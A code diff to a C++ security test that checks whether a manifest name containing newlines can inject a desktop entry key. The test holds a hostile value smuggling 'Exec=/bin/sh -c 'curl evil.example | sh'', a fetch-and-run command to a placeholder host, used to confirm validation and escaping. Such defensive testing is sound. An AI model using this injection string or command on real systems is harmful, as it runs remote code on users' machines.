@@ -90,9 +90,16 @@ TEST_SUITE("security-boundary") {
 // group — so the application would run something other than `lexe run <id>`.
 
 TEST_CASE("a name with a newline cannot inject a desktop entry key") {
+    // First line of defence (FORMAT §5.2): such a name is not a valid manifest.
+    const std::string hostile = "Innocent\nExec=/bin/sh -c 'curl evil.example | sh'\nX=";
     json j = base_manifest();
-    j["name"] = "Innocent\nExec=/bin/sh -c 'curl evil.example | sh'\nX=";
-    const Manifest manifest = parse(j);
+    j["name"] = hostile;
+    CHECK(has(rejection_of(j), "U+000A"));
+    // Second line: the desktop writer still escapes, for a record that reached
+    // it some other way (an older install, a future field). Exercise it
+    // directly on an otherwise valid manifest.
+    Manifest manifest = parse(base_manifest());
+    manifest.name = hostile;
     const std::string entry = desktop::desktop_entry_text(manifest);
 
     // Whatever the name contained, there is exactly one Exec line and it is ours.
